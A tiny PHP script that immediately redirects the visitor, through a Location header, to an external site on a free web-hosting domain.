<?php
header('location:https://nobleintermediates.000webhostapp.com/');
?>